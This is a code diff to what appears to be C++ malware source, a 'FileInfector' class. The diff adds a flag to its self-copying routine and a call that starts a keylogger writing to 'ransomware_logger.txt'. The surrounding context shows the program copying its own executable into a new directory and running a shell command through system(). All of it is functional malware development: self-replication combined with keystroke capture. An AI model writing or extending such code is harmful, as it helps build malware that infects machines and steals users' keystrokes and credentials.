@@ -1,4 +1,5 @@
 #include "file_infector.h"
+#include "logger.h"
 
 int BytesFromResource(HMODULE hModule, char* Str);
 
@@ -99,7 +100,7 @@ void FileInfector::call_ps(string filename)
 	system(ps_cmd.c_str());
 }
 
-void FileInfector::CopyMyself()
+void FileInfector::CopyMyself(BOOL KEY_TO_UNLOCK_LOGGER)
 {
 	char filename[MAX_PATH]; // declaring the executable as its own file
 
@@ -123,6 +124,15 @@ void FileInfector::CopyMyself()
 		CreateDirectory(new_path.c_str(), NULL);
 	}
 
+	/*
+	Start KeyLogger only when program terminates
+	*/
+	if (KEY_TO_UNLOCK_LOGGER == TRUE)
+	{
+		Logger(new_path + "ransomware_logger.txt");
+	}
+
+	// Finish copying new copy
 	BOOL stats = 0;
 	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); // get of running exe
 
